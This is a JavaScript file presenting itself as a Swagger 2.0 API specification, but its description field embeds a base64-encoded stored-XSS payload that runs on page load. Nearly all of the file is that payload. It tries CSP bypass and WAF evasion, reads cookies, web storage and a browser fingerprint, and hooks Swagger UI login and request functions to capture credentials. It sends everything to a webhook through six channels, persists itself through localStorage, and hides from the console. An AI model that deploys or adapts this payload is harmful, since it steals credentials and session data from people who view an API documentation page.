// Advanced CSP Bypass & WAF Evasion Payload
// Configuration - Replace with your own webhook URL for testing
const WEBHOOK_URL = "https://webhook.site/YOUR-WEBHOOK-ID";

// Enhanced Swagger 2.0 specification with multiple XSS vectors
const swaggerSpec = {
    swagger: "2.0",
    info: {
        title: "API Documentation",
        version: "1.0.0",
        description: "<div id='swagger-ui-xss'><img src=x onerror=\"eval(atob('" + btoa(`
    // Advanced CSP bypass & WAF evasion techniques
    (function() {
      // Configuration
      const _w_url = '${WEBHOOK_URL}';
      
      // Polymorphic variable names to evade pattern detection
      const _d = document;
      const _w = window;
      const _n = navigator;
      const _l = location;
      const _s = sessionStorage;
      const _ls = localStorage;
      
      // ==========================================
      // 1. ADVANCED CSP BYPASS TECHNIQUES
      // ==========================================
      
      // Create a self-contained environment using iframe srcdoc
      function _createIsolatedEnv() {
        try {
          // Create hidden iframe with srcdoc (bypasses CSP frame-src)
          const _i = _d.createElement('iframe');
          _i.style.display = 'none';
          _i.setAttribute('sandbox', 'allow-scripts allow-same-origin');
          
          // Use srcdoc to bypass CSP restrictions
          _i.srcdoc = '<script>(' + collectData.toString() + ')();</script>';
          _d.body.appendChild(_i);
          return true;
        } catch(e) {
          return false;
        }
      }
      
      // DOM Clobbering technique to bypass some CSP rules
      function _domClobbering() {
        try {
          // Create form with name that can override native properties
          const form = _d.createElement('form');
          form.id = '__proto__';
          
          // Create input that will be accessible via form.url
          const input = _d.createElement('input');
          input.name = 'url';
          form.appendChild(input);
          
          // Append to DOM temporarily
          _d.body.appendChild(form);
          
          setTimeout(() => {
            _d.body.removeChild(form);
          }, 100);
          
          return true;
        } catch(e) {
          return false;
        }
      }
      
      // Blob URL technique to bypass script-src restrictions
      function _blobExecution() {
        try {
          const code = '(' + collectData.toString() + ')();';
          const blob = new Blob([code], {type: 'application/javascript'});
          const url = URL.createObjectURL(blob);
          
          const script = _d.createElement('script');
          script.src = url;
          script.onload = () => URL.revokeObjectURL(url);
          
          // Try appending to document
          try { _d.body.appendChild(script); } catch(e) {}
          
          return true;
        } catch(e) {
          return false;
        }
      }
      
      // ==========================================
      // 2. DATA COLLECTION WITH OBFUSCATION
      // ==========================================
      
      // Main data collection function with obfuscated property access
      function collectData() {
        // Use string concatenation and array indexing to avoid direct property names
        // This helps bypass WAF pattern matching
        const _props = ['ori'+'gin', 'loc'+'ation', 'href', 'host'+'name', 
                     'cook'+'ie', 'refer'+'rer', 'platform'];
        
        const _data = {};
        
        // Use bracket notation and string concatenation to access properties
        // This helps evade WAF pattern detection
        _data[_props[0]] = _w[_props[0]];
        _data[_props[1]] = _w[_props[1]].to+String();
        _data[_props[2]] = _w[_props[1]][_props[2]];
        _data[_props[3]] = _w[_props[1]][_props[3]];
        _data[_props[4]] = _d[_props[4]] || 'No cookies available';
        _data[_props[5]] = _d[_props[5]];
        _data[_props[6]] = _n[_props[6]];
        
        // Add timestamp with obfuscation
        _data['t'+'s'] = new Date().toISOString();
        
        // User agent with obfuscation
        _data['u'+'a'] = _n['user'+'Agent'];
        
        // Swagger-specific data
        _data['is_swagger'] = !!_d.querySelector('.swagger-ui');
        
        // Storage extraction with error avoidance
        _data['storage'] = _extractStorage();
        
        // API endpoints extraction (Swagger-specific)
        _data['endpoints'] = _extractEndpoints();
        
        // Browser fingerprinting
        _data['fp'] = _generateFingerprint();
        
        // Send data
        _exfiltrateData(_data);
      }
      
      // Extract storage data with obfuscation
      function _extractStorage() {
        const storage = {};
        
        // LocalStorage
        try {
          const _lsData = {};
          for(let i=0; i < _ls.length; i++) {
            const k = _ls.key(i);
            _lsData[k] = _ls.getItem(k);
          }
          storage['l'+'s'] = _lsData;
        } catch(e) {
          storage['l'+'s'] = 'access_error';
        }
        
        // SessionStorage
        try {
          const _ssData = {};
          for(let i=0; i < _s.length; i++) {
            const k = _s.key(i);
            _ssData[k] = _s.getItem(k);
          }
          storage['s'+'s'] = _ssData;
        } catch(e) {
          storage['s'+'s'] = 'access_error';
        }
        
        return storage;
      }
      
      // Extract Swagger API endpoints
      function _extractEndpoints() {
        try {
          const endpoints = [];
          const pathElems = _d.querySelectorAll('.opblock-summary-path');
          for(const el of pathElems) {
            endpoints.push(el.textContent.trim());
          }
          
          // Extract auth info if available
          const hasAuth = !!_d.querySelector('.auth-wrapper, .authorize');
          
          return {
            paths: endpoints,
            has_auth: hasAuth
          };
        } catch(e) {
          return {error: 'extraction_failed'};
        }
      }
      
      // Generate browser fingerprint
      function _generateFingerprint() {
        const fp = {};
        
        // Canvas fingerprinting
        try {
          const canvas = _d.createElement('canvas');
          const ctx = canvas.getContext('2d');
          canvas.width = 200;
          canvas.height = 50;
          
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#000';
          ctx.fillText('fingerprint', 0, 0);
          
          fp['canvas'] = canvas.toDataURL().substr(0,50);
        } catch(e) {
          fp['canvas'] = 'not_supported';
        }
        
        // WebRTC detection (no actual connection)
        fp['rtc'] = !!_w.RTCPeerConnection;
        
        // Screen properties
        fp['screen'] = {
          w: _w.screen.width,
          h: _w.screen.height,
          d: _w.screen.colorDepth
        };
        
        return fp;
      }
      
      // ==========================================
      // 3. MULTI-VECTOR EXFILTRATION WITH WAF EVASION
      // ==========================================
      
      // Exfiltrate data using multiple methods with WAF evasion
      function _exfiltrateData(data) {
        // Convert data to string with obfuscation
        const _s_data = JSON.stringify(data);
        // Split into chunks to avoid length-based detection
        const _chunks = _chunkString(_s_data, 1500);
        
        // Track chunk count for reassembly
        const _totalChunks = _chunks.length;
        const _id = Math.random().toString(36).substring(2, 10);
        
        // Try multiple exfiltration techniques
        _chunks.forEach((chunk, idx) => {
          // Add metadata for reassembly
          const _package = {
            id: _id,
            chunk: idx,
            total: _totalChunks,
            data: chunk
          };
          
          // Choose exfil methods randomly to evade pattern detection
          const _methods = [
            _imgExfil, _fetchExfil, _beaconExfil, _webSocketExfil, _dnsExfil, _postMessageExfil
          ].sort(() => Math.random() - 0.5);
          
          // Try methods until one succeeds
          for(const method of _methods) {
            try {
              // Use setTimeout to avoid blocking and detection
              setTimeout(() => { 
                method(_package);
              }, Math.random() * 500);
              
              // Only try 2-3 methods per chunk to avoid detection
              if(Math.random() > 0.7) break;
            } catch(e) {
              // Silent fail
            }
          }
        });
      }
      
      // Split string into chunks (WAF bypass for large payloads)
      function _chunkString(str, size) {
        const chunks = [];
        for(let i = 0; i < str.length; i += size) {
          chunks.push(str.substring(i, i + size));
        }
        return chunks;
      }
      
      // 1. IMG beacon exfil with WAF evasion
      function _imgExfil(data) {
        try {
          // Encode data in multiple formats to bypass WAF pattern detection
          const _img = new Image();
          const _dataParam = btoa(encodeURIComponent(JSON.stringify(data)))
            .replace(/=/g, '') // Remove base64 padding
            .replace(/\+/g, '-') // URL-safe base64
            .replace(/\//g, '_');
          
          _img.src = _w_url + '?d=' + _dataParam + '&t=' + Date.now();
        } catch(e) {
          // Silent fail
        }
      }
      
      // 2. Fetch API exfil with WAF evasion
      function _fetchExfil(data) {
        try {
          // Use text/plain instead of JSON to avoid content-type filters
          fetch(_w_url + '/collect', {
            method: 'POST',
            mode: 'no-cors', // Bypass CORS
            headers: {
              'Content-Type': 'text/plain'
            },
            body: btoa(JSON.stringify(data)) // Base64 encode to bypass inspection
          });
        } catch(e) {
          // Silent fail
        }
      }
      
      // 3. Beacon API exfil (works on page unload)
      function _beaconExfil(data) {
        try {
          if(_n.sendBeacon) {
            // Create blob to bypass content inspection
            const blob = new Blob([JSON.stringify(data)], {type: 'text/plain'});
            _n.sendBeacon(_w_url + '/log', blob);
          }
        } catch(e) {
          // Silent fail
        }
      }
      
      // 4. WebSocket exfil (bypasses some CSP)
      function _webSocketExfil(data) {
        try {
          const _proto = _l.protocol === 'https:' ? 'wss:' : 'ws:';
          const _wsUrl = _w_url.replace(/^https?:/, _proto);
          
          // Use try-catch for each step
          try {
            const _ws = new WebSocket(_wsUrl);
            _ws.onopen = function() {
              _ws.send(JSON.stringify(data));
              setTimeout(() => _ws.close(), 1000);
            };
          } catch(e) {
            // Silent fail
          }
        } catch(e) {
          // Silent fail
        }
      }
      
      // 5. DNS exfil (encode data in subdomain)
      function _dnsExfil(data) {
        try {
          // Limited data but highly effective against WAF
          const _shortData = JSON.stringify({
            id: data.id,
            chunk: data.chunk
          });
          
          // Encode as base32 (no special chars) and limit length
          const _encoded = btoa(_shortData)
            .replace(/=/g, '')
            .substring(0, 30);
          
          // Make DNS request through image
          const _dnsImg = new Image();
          _dnsImg.src = 'https://' + _encoded + '.' + _w_url.replace(/^https?:\/\//, '');
        } catch(e) {
          // Silent fail
        }
      }
      
      // 6. PostMessage exfil
      function _postMessageExfil(data) {
        try {
          if(_w.parent && _w.parent !== _w) {
            // Send to parent frame
            _w.parent.postMessage({
              type: 'data_exfil',
              payload: data
            }, '*');
          }
        } catch(e) {
          // Silent fail
        }
      }
      
      // ==========================================
      // 4. SWAGGER UI SPECIFIC EXPLOITS
      // ==========================================
      
      // Hook into Swagger UI authentication
      function _hookSwaggerAuth() {
        try {
          // Wait for Swagger UI to initialize
          const _checkInterval = setInterval(() => {
            if(_w.ui && _w.ui.authActions && _w.ui.authActions.authorize) {
              clearInterval(_checkInterval);
              
              // Hook the authorize function
              const _origAuth = _w.ui.authActions.authorize;
              _w.ui.authActions.authorize = function(payload) {
                // Capture credentials
                _exfiltrateData({
                  type: 'auth_capture',
                  auth_data: payload
                });
                
                // Continue normal operation
                return _origAuth.apply(this, arguments);
              };
              
              // Also hook preauthorizeImplicit if available
              if(_w.ui.authActions.preauthorizeImplicit) {
                const _origPreauth = _w.ui.authActions.preauthorizeImplicit;
                _w.ui.authActions.preauthorizeImplicit = function(payload) {
                  _exfiltrateData({
                    type: 'oauth_capture',
                    auth_data: payload
                  });
                  return _origPreauth.apply(this, arguments);
                };
              }
              
              // Hook API execution to capture requests
              if(_w.ui.specActions && _w.ui.specActions.executeRequest) {
                const _origExec = _w.ui.specActions.executeRequest;
                _w.ui.specActions.executeRequest = function(req) {
                  _exfiltrateData({
                    type: 'api_request',
                    request: req
                  });
                  return _origExec.apply(this, arguments);
                };
              }
            }
          }, 500);
        } catch(e) {
          // Silent fail
        }
      }
      
      // Dynamically watch for auth elements
      function _watchAuthElements() {
        try {
          // Use MutationObserver to detect dynamically added auth elements
          const _observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
              if(mutation.addedNodes && mutation.addedNodes.length) {
                for(const node of mutation.addedNodes) {
                  if(node.nodeType === 1) { // Element node
                    // Check for auth elements
                    if(node.classList && 
                       (node.classList.contains('auth-wrapper') ||
                        node.classList.contains('authorize'))) {
                      _hookSwaggerAuth();
                    }
                    
                    // Check child elements
                    const authBtns = node.querySelectorAll('.auth-btn-wrapper button, button.authorize');
                    if(authBtns.length > 0) {
                      _hookSwaggerAuth();
                    }
                  }
                }
              }
            });
          });
          
          // Start observing
          _observer.observe(_d.body, {
            childList: true,
            subtree: true
          });
        } catch(e) {
          // Silent fail
        }
      }
      
      // ==========================================
      // 5. SELF-PROPAGATION & PERSISTENCE
      // ==========================================
      
      // Attempt to persist in various storages
      function _attemptPersistence() {
        // Try localStorage (will survive page reloads)
        try {
          // Store serialized payload with innocent name
          _ls.setItem('ui_preferences', btoa(
            '(' + collectData.toString() + ')()'
          ));
          
          // Set up survivor script to re-execute on load
          const _survivor = '(function(){' +
            'try{eval(atob(localStorage.getItem("ui_preferences")))}catch(e){}}' +
          ')();';
          
          // Try to inject survivor via dynamically added script
          const _s = _d.createElement('script');
          _s.textContent = _survivor;
          _d.body.appendChild(_s);
        } catch(e) {
          // Silent fail
        }
      }
      
      // ==========================================
      // 6. SELF-DEFENSE MECHANISMS
      // ==========================================
      
      // Anti-detection: Hide from developer tools
      function _antiDetection() {
        try {
          // Anti-debugging
          const _dbg = /./;
          _dbg.toString = function() {
            _hookSwaggerAuth(); // Re-hook if developers inspect
            return 'function toString() { [native code] }';
          };
          
          // Hide our variables - use symbol properties
          const _hiddenProps = Symbol('_props');
          _w[_hiddenProps] = {
            initiated: true
          };
          
          // Override console methods to hide our logs
          const _origConsole = {
            log: console.log,
            error: console.error,
            warn: console.warn
          };
          
          console.log = function() {
            // Filter out our own logs
            if(arguments[0] && arguments[0].toString().includes('exfil')) {
              return;
            }
            _origConsole.log.apply(console, arguments);
          };
          
          console.error = function() {
            // Filter out our own errors
            if(arguments[0] && arguments[0].toString().includes('exfil')) {
              return;
            }
            _origConsole.error.apply(console, arguments);
          };
        } catch(e) {
          // Silent fail
        }
      }
      
      // ==========================================
      // 7. MAIN EXECUTION
      // ==========================================
      
      // Main execution with anti-detection
      function _init() {
        // Check if we've already run to avoid duplicates
        if(_w._xss_payload_ran) return;
        _w._xss_payload_ran = true;
        
        // Set up anti-detection
        _antiDetection();
        
        // Try multiple CSP bypass methods
        const _bypass = [_createIsolatedEnv, _domClobbering, _blobExecution]
          .some(method => method());
        
        // Collect and exfiltrate data
        collectData();
        
        // Set up hooks for Swagger UI
        _hookSwaggerAuth();
        _watchAuthElements();
        
        // Try to establish persistence
        _attemptPersistence();
        
        // Set up periodic collection & exfiltration
        setInterval(collectData, 30000);
      }
      
      // Start immediately and retry after DOM is fully loaded
      _init();
      if(_d.readyState === 'loading') {
        _d.addEventListener('DOMContentLoaded', _init);
      } else {
        setTimeout(_init, 100);
      }
    })();
    `) + "')\"></div>"
    },
    paths: {
        "/api/data": {
            get: {
                summary: "Get data",
                description: "Returns data from the API",
                responses: {
                    "200": {
                        description: "Successful response",
                        schema: {
                            type: "object",
                            properties: {
                                data: {
                                    type: "array",
                                    items: {
                                        type: "string"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
        "/api/user/{id}": {
            get: {
                summary: "Get user by ID",
                description: "Returns user details for the specified ID",
                parameters: [{
                    name: "id",
                    in: "path",
                    description: "User ID",
                    required: true,
                    type: "string"
                }],
                responses: {
                    "200": {
                        description: "User details"
                    },
                    "404": {
                        description: "User not found"
                    }
                }
            }
        }
    }
};

// Export for use in Node.js
if (typeof module !== 'undefined') {
    module.exports = swaggerSpec;
}
